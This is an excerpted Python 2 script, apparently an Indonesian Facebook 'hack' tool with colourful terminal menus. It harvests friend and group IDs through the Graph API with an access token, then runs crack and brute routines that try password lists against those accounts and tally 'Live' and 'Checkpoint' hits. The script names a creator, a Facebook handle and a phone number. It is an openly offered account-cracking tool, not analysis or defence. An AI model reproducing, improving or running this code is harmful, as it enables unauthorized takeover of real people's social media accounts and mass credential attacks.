...
\033[37;1m-----------------------------
 \033[33;1m* \033[32;1mCreator \033[31;1m: \033[37;1mFaizul
 \033[33;1m* \033[32;1mFacebook \033[31;1m: \033[37;1mFaizul
 \033[33;1m* \033[32;1mWhastapp \033[31;1m: \033[37;1m082241426251
\033[37;1m-----------------------------"""
...
def masuk():
	os.system('reset')
	print logo
	print "\033[0;32m[1] \033[0;32mLOG IN ACCES TOKEN USER"
	print "\033[31;1m[0] \033[31;1mEXIT"
	
	msuk = raw_input("\033[1;1m[CHOOICHE] \033[1;93m")
	if msuk =="":
...
def menu():
	...
	print "\033[1;97m╚"+40*"═"
	print "\033[31;1mUser information"
	print "\033[31;1mGet Id/email/hp"
	print "\033[31;1mHack facebook account               "
	print "\033[31;1mBot Facebook       "
	print "\033[31;1mOthers           "
	print "\033[31;1mShow token           "
	print "\033[31;1mDelete trash          "
	print "\033[31;1mLogOut            "
	print "\033[31;mExit the programs          "
	
	pilih()
#-
def pilih():
	zedd = raw_input("\033[31;1m[chooice >>] \033[1;97m")
	if zedd =="":
		print "\033[1;91m[!] Wrong input"
		pilih()
	elif zedd =="1":
...
#-----pilih
def dump_pilih():
	cuih = raw_input("\033[0;32m[Chooice >>] \033[1;97m")
	if cuih =="":
		print "\033[1;91m[!] Wrong input"
		dump_pilih()
	elif cuih =="1":
...
def idfrom_teman():
	...
	try:
		os.system('reset')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mSuntik ID friend \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mIDs\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
		...
		z=json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mMengambil ID Teman \033[1;97m...')
		print 42*"\033[1;97m═"
...
#----pilih
def hack_pilih():
	hack = raw_input("\033[31;1m[Chooice >>] \033[31;1m")
	if hack=="":
		print "\033[1;91m[!] Wrong input"
		hack_pilih()
	elif hack =="1":
...
def mini():
	...
	os.system('reset')
	print logo
	print "\033[1;97m[\033[1;91mINFO\033[1;97m] \033[1;91mIDs Target Harus Berteman terlebih Dahulu\n       Sebelum Menghack"
	print 42*"\033[1;97m═"
	try:
		id = raw_input("\033[1;91m[+] \033[1;92mTarget IDs \033[1;91m:\033[1;97m ")
		jalan('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		a = json.loads(r.text)
		print '\033[1;91m[➹] \033[1;92mID Target\033[1;97m : '+a['name']
		jalan('\033[1;91m[+] \033[1;92mSedang Ngentot \033[1;97m...')
		time.sleep(2)
...
def crack():
	...
	try:
		file = open((idlist), "r")
		jalan('\033[1;91m[✺] \033[1;92mOtw \033[1;97m...')
		for x in range(40):
	...
	try:
		...
		while file:
			...
			if 'access_token' in mpsh:
				...
				back +=1
			sys.stdout.write('\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mSedang Mengngentot   \033[1;91m:\033[1;97m '+str(back)+' \033[1;96m>\033[1;97m '+str(len(up))+' =>\033[1;92mLive\033[1;91m:\033[1;96m'+str(len(berhasil))+' \033[1;97m=>\033[1;93mCheck\033[1;91m:\033[1;96m'+str(len(cekpoint)));sys.stdout.flush()
	except IOError:
		print"\n\033[1;91m[!] Sleep"
		time.sleep(3)
	except requests.exceptions.ConnectionError:
...
def pilih_super():
	peak = raw_input("\033[1;91m[Chooice] \033[1;97m")
	if peak =="":
		print "\033[1;91m[!] Wrong input"
		pilih_super()
	elif peak =="1":
		os.system('reset')
		print logo
		jalan('\033[1;94m[✺] \033[1;96mMengambil ID Teman\033[1;95m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
		...
		os.system('reset')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mSuntik ID Teman \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mID\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			super()
		jalan('\033[1;91m[✺] \033[1;96mMengambil ID Teman Dari Teman\033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
		...
		os.system('reset')
		print logo
		idg=raw_input('\033[1;91m[+] \033[1;92mSuntik ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mID group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			super()
		jalan('\033[1;91m[✺] \033[1;92mID Grup\033[1;97m...')
	...
	jalan('\033[1;91m[✺] \033[1;92mSedang Mengngentot\033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mNgentot Berjalan Harap Tunggu\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print 42*"\033[1;97m═"
...
def brute():
	...
	try:
		...
		for pw in sandi:
			try:
				pw = pw.replace("\n","")
				sys.stdout.write("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mSedang Mengngentot \033[1;91m: \033[1;97m"+pw)
				sys.stdout.flush()
